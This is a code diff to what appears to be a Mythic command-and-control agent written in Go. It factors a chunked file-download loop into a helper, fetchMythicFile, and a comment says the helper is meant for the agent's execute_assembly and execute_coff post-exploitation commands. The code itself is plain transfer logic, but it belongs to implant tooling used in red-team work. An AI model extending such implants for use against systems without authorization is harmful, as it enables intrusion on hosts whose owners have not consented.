@@ -201,6 +201,51 @@ func downloadToMythic(taskID, path string, chunkSize int, post poster) (string, 
 	return fmt.Sprintf("downloaded %s (%d bytes in %d chunks)", path, st.Size(), total), nil
 }
 
+// fetchMythicFile pulls a Mythic-hosted file in 1-based chunks, writing
+// each chunk to w, and returns bytes written plus chunk count. Unlike
+// uploadFromMythic it posts no completion: callers that keep working
+// afterwards (execute_assembly, execute_coff) complete the task themselves.
+func fetchMythicFile(taskID, fileID string, chunkSize int, post poster, w io.Writer) (int64, int, error) {
+	if fileID == "" {
+		return 0, 0, fmt.Errorf("no file id")
+	}
+	if chunkSize <= 0 {
+		chunkSize = chunkSizeDefault
+	}
+	var written int64
+	total := -1
+	for chunk := 1; ; chunk++ {
+		replies, err := post([]Response{{
+			TaskID: taskID, Completed: false, Status: "success",
+			Upload: &UploadPayload{ChunkNum: chunk, ChunkSize: intPtr(chunkSize), FileID: stringPtr(fileID)},
+		}})
+		if err != nil {
+			return written, 0, err
+		}
+		reply, err := replyFor(replies, taskID)
+		if err != nil {
+			return written, 0, err
+		}
+		if reply.TotalChunks <= 0 || reply.TotalChunks > maxTransferChunks {
+			return written, 0, fmt.Errorf("bad total_chunks %d", reply.TotalChunks)
+		}
+		total = reply.TotalChunks
+		raw, err := base64.StdEncoding.DecodeString(reply.ChunkData)
+		if err != nil {
+			return written, 0, fmt.Errorf("chunk %d: %w", chunk, err)
+		}
+		n, err := w.Write(raw)
+		if err != nil {
+			return written, 0, err
+		}
+		written += int64(n)
+		if chunk >= total {
+			break
+		}
+	}
+	return written, total, nil
+}
+
 // uploadFromMythic pulls a Mythic-hosted file to remotePath in 1-based
 // chunks, returning a summary.
 func uploadFromMythic(taskID, fileID, remotePath string, chunkSize int, post poster) (string, error) {
@@ -223,36 +268,9 @@ func uploadFromMythic(taskID, fileID, remotePath string, chunkSize int, post pos
 		return "", err
 	}
 	defer f.Close()
-	var written int64
-	total := -1
-	for chunk := 1; ; chunk++ {
-		replies, err := post([]Response{{
-			TaskID: taskID, Completed: false, Status: "success",
-			Upload: &UploadPayload{ChunkNum: chunk, ChunkSize: intPtr(chunkSize), FileID: stringPtr(fileID)},
-		}})
-		if err != nil {
-			return "", err
-		}
-		reply, err := replyFor(replies, taskID)
-		if err != nil {
-			return "", err
-		}
-		if reply.TotalChunks <= 0 || reply.TotalChunks > maxTransferChunks {
-			return "", fmt.Errorf("bad total_chunks %d", reply.TotalChunks)
-		}
-		total = reply.TotalChunks
-		raw, err := base64.StdEncoding.DecodeString(reply.ChunkData)
-		if err != nil {
-			return "", fmt.Errorf("chunk %d: %w", chunk, err)
-		}
-		n, err := f.Write(raw)
-		if err != nil {
-			return "", err
-		}
-		written += int64(n)
-		if chunk >= total {
-			break
-		}
+	written, total, err := fetchMythicFile(taskID, fileID, chunkSize, post, f)
+	if err != nil {
+		return "", err
 	}
 	summary := fmt.Sprintf("uploaded %s (%d bytes in %d chunks)", remotePath, written, total)
 	replies, err := post([]Response{{
